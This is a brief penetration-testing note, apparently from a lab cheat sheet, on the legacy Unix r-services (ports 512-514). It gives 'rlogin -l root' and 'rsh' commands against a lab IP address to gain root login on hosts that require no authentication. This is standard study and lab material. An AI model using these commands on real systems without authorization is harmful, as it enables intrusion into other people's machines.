## What is r-services

R-services run on port 512,513,514.
 
From a Unix-based platform, you use rsh, rlogin, and rexec clients to access the respective r-services running on a remote host.

## Exploitation
 
The problem with r services is that it allows remotely logging to the server without requiring any authentication.

```
rlogin -l root 192.168.145.133
```

Make sure rsh-client is installed.Else it will default to ssh and hence will prompt for ssh key.

__Alternate way to exploit:__

```
rsh 192.168.145.133
```